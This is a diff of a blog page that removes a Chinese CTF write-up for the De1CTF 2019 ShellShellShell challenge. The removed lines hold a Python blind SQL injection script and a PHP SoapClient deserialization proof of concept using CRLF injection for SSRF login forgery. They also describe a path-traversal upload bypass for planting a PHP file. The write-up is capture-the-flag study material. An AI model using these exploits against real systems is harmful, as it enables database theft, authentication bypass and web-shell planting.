@@ -183,30 +183,6 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
 <div class="pattern-center-blank"></div>
 
-  <div class="pattern-center single-center">
-    <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1135807.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1135807.jpg">
-    </div>
-    <header class="pattern-header single-header">
-      <h1 class="entry-title">
-      [De1CTF 2019]ShellShellShell</h1>
-      <p class="entry-census">
-        <span>
-          <a href="">
-            <img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210308190505.jpg">
-          </a>
-        </span>
-        <span>
-          <a href="">Troy3e</a>
-        </span>
-        <span class="bull">
-        ·</span>
-        2021-3-10<span class="bull">
-        ·</span>
-      <span id="busuanzi_value_page_pv"></span>次阅读</p>
-    </header>
-  </div>
-
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
@@ -214,104 +190,15 @@
         <div class="toc"></div>
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
+          <header class="entry-header">
+            <h1 class="entry-title">[De1CTF 2019]ShellShellShell</h1>
+            <p class="entry-census">Troy3e&nbsp;·&nbsp;2021-3-11&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+
+            <hr>
+          </header>
+        
         <div class="entry-content">
-          <p>好久没更新了，今天开始恢复学习模式。<br>本学期目标：两天一个BuuWP，多打比赛，加入一个大佬战队，剩下的时间都学习渗透。</p>
-<p>这题知识量巨大，看了很多wp，首先先自动审一下源码：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210310214904.png" alt></p>
-<p>一个个看，首先看config.php相应位置代码：</p>
-<pre><code>public function insert($columns,$table,$values){
-
-    $column = $this-&gt;get_column($columns);
-    $value = &#39;(&#39;.preg_replace(&#39;/`([^`,]+)`/&#39;,&#39;\&#39;${1}\&#39;&#39;,$this-&gt;get_column($values)).&#39;)&#39;;
-    $nid =
-    $sql = &#39;insert into &#39;.$table.&#39;(&#39;.$column.&#39;) values &#39;.$value;
-    $result = $this-&gt;conn-&gt;query($sql);
-
-    return $result;
-}
-</code></pre><p>会把反引号替换为单引号，为sql注入创建了条件。</p>
-<p>接下来找到用到insert函数的地方：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210310225646.png" alt></p>
-<p>可以看到$_POST[‘signature’]未经过滤就被直接插入。</p>
-<p>又由于上面insert函数将所有反引号转为单引号，直接盲注：</p>
-<pre><code>import requests
-
-url=&quot;http://a5c4dff4-3e02-4263-8d4a-51aa1ae72651.node3.buuoj.cn/index.php?action=publish&quot;
-cookie = {&quot;PHPSESSID&quot;:&quot;3dk4p3o188kgg1vhvds81qafn2&quot;}
-
-k=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
-flag=&quot;&quot;
-
-for i in range(50):
-    for j in k:
-        j = ord(j)
-        data={
-            &#39;mood&#39;:&#39;0&#39;,
-            &#39;signature&#39;:&#39;1`,if(ascii(substr((select password from ctf_users where username=`admin`),{},1))={},sleep(3),0))#&#39;.format(i,j)
-            }
-        try:
-            r=requests.post(url,data=data,cookies=cookie,timeout=(2,2))
-        except:
-            flag+=chr(j)
-            print(flag)
-            break
-</code></pre><p>跑出来密码的md5为：c991707fdf339958eded91331fb11ba0<br>解密得jaivypassword。</p>
-<p>但是登录却提示ip限制。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311123409.png" alt></p>
-<p>从源码中看到注册需要验证ip</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311124123.png" alt></p>
-<p>跟进get_ip函数</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311124051.png" alt></p>
-<p>REMOTEADDR无法直接伪造，所以寻找ssrf的点。<br>到这就不知道咋做了，照理说soapclient反序列化配合ssrf以前是遇到过的，不过还是没想出来。</p>
-<p>?action=phpinfo（源码中看到的）看到php开启了soap拓展</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311124745.png" alt></p>
-<p>PHP 中，soap扩展可以用来提供和使用 Web Services<br>soapclient类则是用来创建soap数据报文，与wsdl接口进行交互，它有几个内置魔术方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311125817.png" alt></p>
-<p>showmess类里有一个反序列化</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311131339.png" alt></p>
-<p>他看上去会因为sql注入引发反序列化漏洞。<br>所以我们可以注入</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311163944.png" alt></p>
-<p>到库中<br>然后他会在你访问<br>index.php?action=index 的时候触发</p>
-<p>接下来看soapclient类<br>这个类的用法如下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311132909.png" alt></p>
-<p>通过传入两个参数，第一个是 $url, 既目标url, 第二个参数是一个数组，里面是soap请求的一些参数和属性。</p>
-<p>我们来查阅一下第二个参数(options)的相关介绍：<br>我们可以看到这个类传入的第一个参数为 $wsdl</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311133539.png" alt></p>
-<p>控制是否是wsdl模式，如果为NULL，就是非wsdl模式.<br>如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，</p>
-<p>我们可以在 PHP 源码中看到</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311133811.png" alt></p>
-<p>如果把 \x0d\x0a 注入到 SOAPAction , 这个POST请求的部分header会被控制(CRLF)<br>但是我们不能控制 Content-Type,就不能控制POST的数据，所以就不能登录admin。</p>
-<p>继续阅读php源码，我们发现user_agent 选项同样可以造成 CRLF</p>
-<p>在header里 User-Agent 在 Content-Type 前面, 我们我们可以很轻松的控制整个POST报文</p>
-<p>可以生成任意POST报文的POC：</p>
-<pre><code>&lt;?php
-$target = &#39;http://127.0.0.1/index.php?action=login&#39;;
-$post_string = &#39;username=admin&amp;password=jaivypassword&amp;code=1278816&#39;;
-$headers = array(
-    &#39;X-Forwarded-For: 127.0.0.1&#39;,
-    &#39;Cookie: PHPSESSID=46ek6rejdtj36sm2sk2psu1i02&#39;
-    );
-$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));
-
-$aaa = serialize($b);
-$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);
-$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);
-echo bin2hex($aaa);
-?&gt;
-</code></pre><p>这里注意target那里是127.0.0.1(因为是ssrf)，一开始没注意直接用的url，花了两小时踩坑。</p>
-<p>成功进去之后是一个上传</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311155056.png" alt></p>
-<p>ifconfig查看ip</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311161429.png" alt></p>
-<p>端口80开放<br>把源码下下来</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311161504.png" alt></p>
-<p>访问</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311161631.png" alt></p>
-<p>第一层数组来绕过，第二层随机文件名用路径穿越绕过。<br>构造file[1]=aaa&amp;file[0]=php/../troy3e.php<br>postman构造传入<br>这里懒得构造了，因为已经被这题折磨了一下午了，拿个现成的upload：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210311162645.png" alt></p>
-<p>做了一下午，脑子都晕了QWQ</p>
-<p>参考链接：<br><a href="https://blog.csdn.net/qq_43756333/article/details/107386403" target="_blank" rel="noopener">https://blog.csdn.net/qq_43756333/article/details/107386403</a><br><a href="https://my.oschina.net/u/4410805/blog/3391684" target="_blank" rel="noopener">https://my.oschina.net/u/4410805/blog/3391684</a><br><a href="https://blog.csdn.net/a3320315/article/details/104088080" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104088080</a><br><a href="https://www.freesion.com/article/5426702156/" target="_blank" rel="noopener">https://www.freesion.com/article/5426702156/</a><br><a href="https://xz.aliyun.com/t/2148#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148#toc-0</a></p>
-
+          
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
